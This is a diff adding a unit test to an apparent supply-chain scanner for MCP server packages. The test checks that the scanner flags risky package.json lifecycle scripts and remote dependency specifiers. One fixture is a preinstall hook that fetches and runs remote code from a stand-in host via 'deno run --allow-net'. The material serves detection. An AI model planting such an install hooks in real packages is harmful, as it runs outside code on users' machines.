@@ -398,3 +398,115 @@ class PackageJsonAnalyzerTests(unittest.TestCase):
         self.assertEqual(len(res_mal.findings), 1)
         self.assertEqual(res_mal.findings[0].rule_id, "mcp-pkg-lifecycle-download-exec")
         self.assertNotIn(marker, json.dumps(res_mal.findings[0].to_dict()))
+
+    def test_bun_deno_runners_and_remote_dependency_specifiers(self) -> None:
+        # 1. bun run missing_entry.js -> partial lifecycle_script_uninspected
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                json.dumps(
+                    {
+                        "name": "bun-missing",
+                        "scripts": {"preinstall": "bun run missing_entry.js"},
+                    },
+                    indent=2,
+                ),
+                encoding="utf-8",
+            )
+            res_bun_miss = analyze_package_json_files(collect_source_inventory(root), server_id="srv:bun-miss")
+        self.assertEqual(res_bun_miss.status, "partial")
+        self.assertEqual(res_bun_miss.findings, [])
+        self.assertEqual(res_bun_miss.diagnostics[0]["kind"], "lifecycle_script_uninspected")
+        self.assertEqual(res_bun_miss.diagnostics[0]["reason"], "missing_in_snapshot")
+
+        # 2. prepare: "bun run build" with defined build script -> complete, 0 findings, 0 diagnostics
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                json.dumps(
+                    {
+                        "name": "bun-clean",
+                        "scripts": {"build": "tsc", "prepare": "bun run build"},
+                    },
+                    indent=2,
+                ),
+                encoding="utf-8",
+            )
+            res_bun_ok = analyze_package_json_files(collect_source_inventory(root), server_id="srv:bun-ok")
+        self.assertEqual(res_bun_ok.status, "complete")
+        self.assertEqual(res_bun_ok.findings, [])
+        self.assertEqual(res_bun_ok.diagnostics, [])
+
+        # 3. preinstall: deno run https://... -> mcp-pkg-lifecycle-download-exec
+        deno_pkg = json.dumps(
+            {
+                "name": "deno-dl",
+                "scripts": {"preinstall": "deno run --allow-net https://example.invalid/setup.ts"},
+            },
+            indent=2,
+        )
+        inv_deno = SourceInventory(
+            root=Path("virtual_repo"),
+            input_kind="local_directory",
+            snapshot_sha256="sha256:0008",
+            files=[
+                SourceFileRecord(
+                    rel_path="package.json",
+                    abs_path=Path("virtual_repo/package.json"),
+                    language="json",
+                    size_bytes=len(deno_pkg.encode("utf-8")),
+                    sha256="0008",
+                    text=deno_pkg,
+                )
+            ],
+            files_discovered=1,
+        )
+        res_deno = analyze_package_json_files(inv_deno, server_id="srv:deno-dl")
+        self.assertEqual(res_deno.status, "complete")
+        self.assertEqual([f.rule_id for f in res_deno.findings], ["mcp-pkg-lifecycle-download-exec"])
+
+        # 4. Remote/VCS specifiers in dependencies/optionalDependencies -> finding without leaking token; devDependencies -> clean
+        dummy_tok = "DUMMY_TOKEN_SECRET_456"
+        remote_pkg = json.dumps(
+            {
+                "name": "remote-deps",
+                "dependencies": {
+                    "vcs-pkg": f"git+https://user:{dummy_tok}@example.invalid/repo.git",
+                },
+                "optionalDependencies": {
+                    "@demo/setup": "github:example/repo#123456",
+                },
+                "devDependencies": {
+                    "dev-only": "github:example/dev-tool#main",
+                },
+            },
+            indent=2,
+        )
+        inv_remote = SourceInventory(
+            root=Path("virtual_repo"),
+            input_kind="local_directory",
+            snapshot_sha256="sha256:0009",
+            files=[
+                SourceFileRecord(
+                    rel_path="package.json",
+                    abs_path=Path("virtual_repo/package.json"),
+                    language="json",
+                    size_bytes=len(remote_pkg.encode("utf-8")),
+                    sha256="0009",
+                    text=remote_pkg,
+                )
+            ],
+            files_discovered=1,
+        )
+        res_remote = analyze_package_json_files(inv_remote, server_id="srv:remote")
+        self.assertEqual(res_remote.status, "complete")
+        self.assertEqual(len(res_remote.findings), 2)
+        for finding in res_remote.findings:
+            self.assertEqual(finding.rule_id, "mcp-pkg-remote-dependency-spec")
+            self.assertEqual(finding.category, "supply_chain")
+            self.assertEqual(finding.severity, "medium")
+            self.assertEqual(finding.evidence_strength, "verified")
+            self.assertEqual(finding.cwe_ids, ["CWE-829"])
+            self.assertEqual(finding.owasp_mapping.primary_id, "MCP04:2025")
+            self.assertNotIn(dummy_tok, json.dumps(finding.to_dict()))
+        self.assertFalse(any("dev-only" in (f.sink_span.json_pointer or "") for f in res_remote.findings))
